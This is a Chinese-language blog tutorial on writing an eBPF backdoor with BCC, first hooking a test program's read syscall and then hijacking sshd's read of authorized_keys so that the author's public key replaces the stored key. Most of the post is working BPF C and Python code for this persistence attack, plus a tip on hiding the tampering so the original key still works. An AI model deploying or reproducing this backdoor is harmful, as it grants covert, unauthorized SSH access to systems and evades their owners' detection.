## 前言

最近学了点 BCC 的皮毛，完成了密钥分发阶段的密钥劫持。也踩了不少坑，记录一下。网上相关资料质量参差不齐，官方的库[资料](https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md)非常适合入门：库里边的 issue 也有很多很好的高质量问题。

### ebpf 简要说明

eBPF（Extended Berkeley Packet Filter）是一种在 Linux 内核中执行的虚拟机技术，它可以用于网络分析、性能监控、安全审计等多个领域。以下是 eBPF 的一些主要用途：

1. 网络分析：eBPF 可以用于捕获和分析网络数据包，实现高性能的网络监控和故障排查。它可以在内核中执行自定义的过滤逻辑，从而提供更灵活和高效的网络数据包处理能力；
2. 性能监控：eBPF 可以用于收集和分析系统的性能指标，如CPU利用率、内存使用情况、磁盘IO等。通过在内核中执行自定义的监控程序，可以实时获取系统的性能数据，并进行分析和可视化；
3. 安全审计：eBPF 可以用于实现安全审计和入侵检测。通过在内核中执行自定义的安全策略，可以监控系统的行为并检测潜在的安全威胁；
4. 动态追踪：eBPF 可以用于实现动态追踪，即在运行时跟踪系统的执行流程和函数调用。通过在内核中插入自定义的追踪程序，可以获取系统的运行信息，并进行分析和调试。

可以看到，eBPF 是一种强大的技术，可以在内核中执行自定义的程序，从而实现高效的网络分析、性能监控和安全审计等功能。它为开发人员提供了一种灵活和高效的方式来扩展和定制 Linux 系统的行为。而我们本次要做的就是在系统调用前后进行插桩，完成后门。

### BCC 简要说明

BCC（BPF Compiler Collection）是一个基于 eBPF（Extended Berkeley Packet Filter）的工具集合，用于开发和部署 eBPF 程序。

BCC 是一个构建在 eBPF 之上的工具集合，它提供了一组用于开发和部署 eBPF 程序的工具和库。BCC 包含了一些高级工具，如 `bpftrace`、`bpfcc-tools` 和 `bcc-python`，它们简化了 eBPF 程序的开发和调试过程。

BCC 提供了一种更高级的编程接口，使开发者能够使用 C、Python（本次使用到的） 和其他编程语言来编写 eBPF 程序。它还提供了一些预构建的工具和示例，用于网络分析、性能调优和故障排查等方面。

总结来说，BCC 是一个构建在 eBPF 之上的工具集合，它简化了 eBPF 程序的开发和部署过程，并提供了一些高级工具和库来帮助开发者利用 eBPF 技术进行网络分析、性能调优和故障排查等任务。

### ssh 密钥劫持原理

SSH 免密登录是通过使用公钥加密技术来实现的：

1. 生成密钥对：首先，在客户端上生成一对密钥，包括公钥和私钥。通常使用 RSA 或 DSA 算法生成密钥对。私钥应该保持机密，而公钥可以在需要的地方进行分发；
2. 分发公钥：将客户端生成的公钥复制到要进行免密登录的目标主机上的 `~/.ssh/authorized_keys` 文件中。这个文件存储了允许访问该主机的公钥列表；
3. 连接认证：当客户端尝试连接到目标主机时，目标主机会向客户端发送一个随机的挑战。客户端使用其私钥对挑战进行签名，并将签名发送回目标主机；
4. 验证签名：目标主机使用之前存储的客户端公钥来验证客户端发送的签名。如果签名验证成功，则目标主机确认客户端的身份，并允许免密登录。

本次是在 2 阶段，通过把自己的公钥替换到 `~/.ssh/authorized_keys` 中，完成自己的权限维持

## hook 一个测试程序
> 如何修改 buf 字符串？

测试程序如下，本次所有程序都在[该仓库中](https://github.com/pic4xiu/SomethingToPlay/tree/main/ebpf)：

```
//gcc 1.c -o -static -g behooked
//1.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    char buf[4096] = {0x00};
    int fd = open("te.txt", O_RDONLY);
    if (fd < 0) {
        printf("ERROR OPEN FILE");
        return 1;
    }
    memset(buf, 0, sizeof(buf));
    if (read(fd, buf, 4096) > 0) {
        printf("buf address: %p\n", (void *)buf);
        printf("%s\n", buf);
    }
    close(fd);
    return 0;
}
```

这个程序就是实现了一个打开文件，之后把文件中的数据读到 buf 中。我们有很多思路来实现把 buf 的字符串进行修改，这里用 ebpf 技术来 hook `read` 系统调用的方式来实现 buf 的直接修改，见下方代码：

先定义下哈希表，因为我们会存储进程 id 和读取系统调用相关信息的映射关系，有了这个 hash 就可以更方便的进行查询和更新。

```
struct syscall_read_logging
{
    long unsigned int buffer_addr;//用于存储缓冲区地址
    long int calling_size;//用于存储读取大小
};
BPF_HASH(map_buff_addrs,  size_t,struct syscall_read_logging, 1024);
//键是 size_t，值是 struct syscall_read_logging，且大小为 1024，表示能存放 1024 对
```

使用 `TRACEPOINT_PROBE` 宏来拦截的系统调用 `sys_enter_read`，与此对应也一定会有 `sys_exit_read`：

```
TRACEPOINT_PROBE(syscalls, sys_enter_read) {
    char comm[50];//用于存储进程名
    if(bpf_get_current_comm(&comm, 50)) {//把进程名获取到，并存到 comm 中
        return 0;
    }
    const char *target_comm = "behooked";
    for (int i = 0; i < 9; i++)
    {
        if (comm[i] != target_comm[i])//如果不一样的话直接返回就行了
        {
            return 0;
        }
    }
    struct syscall_read_logging data;
    //定义一个 syscall_read_logging 的结构体变量，用于存储读取系统调用的相关信息
    long unsigned int buff_addr = args->buf;
	//获取系统调用中参数的缓冲区地址
    size_t size = args->count;
	//获取系统调用中参数的读取大小
    size_t pid_tgid = bpf_get_current_pid_tgid();
	//获取进程 id
    data.buffer_addr = buff_addr;
	//赋值给 data
    data.calling_size = size;
    map_buff_addrs.update(&pid_tgid, &data);
	//使用 map_buff_addrs 映射来更新当前 id 对应的结构体
    return 0;
}
```

其中这些参数：`args->buf` 都可以在 `tracing` 的 `events` 中查到，十分方便：

```
# cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_read/format
name: sys_enter_read
ID: 680
format:
        field:unsigned short common_type;       offset:0;       size:2; signed:0;
        field:unsigned char common_flags;       offset:2;       size:1; signed:0;
        field:unsigned char common_preempt_count;       offset:3;       size:1; signed:0;
        field:int common_pid;   offset:4;       size:4; signed:1;

        field:int __syscall_nr; offset:8;       size:4; signed:1;
        field:unsigned int fd;  offset:16;      size:8; signed:0;
        field:char * buf;       offset:24;      size:8; signed:0;
        field:size_t count;     offset:32;      size:8; signed:0;

print fmt: "fd: 0x%08lx, buf: 0x%08lx, count: 0x%08lx", ((unsigned long)(REC->fd)), ((unsigned long)(REC->buf)), ((unsigned long)(REC->count))
```

得到了 data 后可以在 ret 的时候完成修改 buf：

```
TRACEPOINT_PROBE(syscalls, sys_exit_read) {
    char comm[50];
    if(bpf_get_current_comm(&comm, 50)) {//把进程名获取到，并存到 comm 中
        return 0;
    }
    char *buff_addr;
        
    size_t pid_tgid = bpf_get_current_pid_tgid();
	//把当前的 id 拿到，方便之后取映射的 data 值
    const char *target_comm = "behooked";
    for (int i = 0; i < 9; i++)
    {
        if (comm[i] != target_comm[i])
        {
            return 0;
        }
    }
    char str[256];
    struct syscall_read_logging *data= map_buff_addrs.lookup(&pid_tgid);//更新到 data 中
        if (data == 0) return 0;//没有的话就直接放回
    char hook[]="flag{true}";//这里存放我们要 hook 成的字符串
    long int te=data->calling_size;//大小
    long unsigned int tmpbuf=(long unsigned int)data->buffer_addr;//拿到地址
    if (te!=4096){
        return 0;
		//事实上，这里可以根据字符串有没有某种东西来判断的，之后在 ssh 的程序会进行优化
        }
    bpf_probe_write_user(tmpbuf, hook, 11); //把字符串放进去
    return 0;
}
```

把 ebpf 跑起来后：

可以看到，我们 hook 了一个系统调用，完成了把 buf 修改成我们的字符串，这时候加点细节和代码就可以完成 ssh 的密钥劫持。实现思路是类似的，本质上就是hook `read` 系统调用，通过把 ssh 读取的密钥替换成攻击者的公钥就完成了。

## ssh 密钥劫持

这里需要注意两点，首先因为 ebpf 能存放的字符是有限的，我们不能把自己的公钥直接放入 ebpf 中，而是需要在 python 外部完成公钥的初始化，之后把它传到一个新的映射中来完成

```
struct string_info {
    char str[600];//在 ebpf 中定义，设定公钥最多包含 600 个字符，其实也可以使用设定不同映射索引来完成公钥拼接
};
BPF_ARRAY(string_array, struct string_info, 10);//同上文提到的 hash，定义 bpf 数组
```

在外部完成字符的传入：

```
import ctypes
# 获取string_array映射
string_array = b.get_table("string_array")
# 定义字符串
long_string = "公钥填这里\n"
part = long_string
string_info = ctypes.create_string_buffer(part.encode())
string_array[ctypes.c_int(0)] = string_info
```

之后的系统调用就是小修小改：

```
TRACEPOINT_PROBE(syscalls, sys_enter_read) {
    char comm[50];
    if(bpf_get_current_comm(&comm, 50)) {
        return 0;
    }
    const char *target_comm = "sshd";
    for (int i = 0; i < 5; i++)
    {
        if (comm[i] != target_comm[i])
        {
            return 0;
        }
    }
    struct syscall_read_logging data;
    long unsigned int buff_addr = args->buf;
    size_t size = args->count;
    size_t pid_tgid = bpf_get_current_pid_tgid();
    data.buffer_addr = buff_addr;
    data.calling_size = size;
    map_buff_addrs.update(&pid_tgid, &data);
    return 0;
}
TRACEPOINT_PROBE(syscalls, sys_exit_read) {
    char comm[50];
    if(bpf_get_current_comm(&comm, 50)) {
        return 0;
    }
    size_t pid_tgid = bpf_get_current_pid_tgid();
    const char *target_comm = "sshd";
    for (int i = 0; i < 5; i++)
    {
        if (comm[i] != target_comm[i])
        {
            return 0;
        }
    }
    struct syscall_read_logging *data= map_buff_addrs.lookup(&pid_tgid);
    if (data == 0) return 0;
    long int te=data->calling_size;
    char* tmpbuf=(char*)data->buffer_addr;
    const char *becheck = "ssh-rsa";
        char str[7];
    bpf_probe_read(str,sizeof(str),(void *)tmpbuf);
    for (int i = 0; i < 7; i++)
    {
        if (becheck[i] != str[i])//看看是不是真正要查的字符串
        {
            return 0;
        }
    }
    int index = 0;
    struct string_info *info = string_array.lookup(&index);
    if (info==0) return 0;
    char *tobe=(char*)info->str;
    long ret = bpf_probe_write_user((void *)tmpbuf, tobe, 581);
    //bpf_trace_printk("tmpbuf:%s\\n", tmpbuf);
    //bpf_trace_printk("tobe:  %s\\n", tobe);
    return 0;
}
```

相当于把整体的文件也改了（密钥替换/劫持），之前的公钥也因为我们的操作不能用了，如果想不暴露的话，可以提前在文件中填写空格占位，来实现添加的操作。

## 总结 & ref

使用 BCC 库可以很方便的完成 ebpf 的编写和程序分发，同时因为是在沙箱环境中运行，可以让我们灵活并安全的调试自己需要的代码；但是后门必须要在较高版本的 kernel 才能实现。

 - https://xz.aliyun.com/t/12173
 - https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md
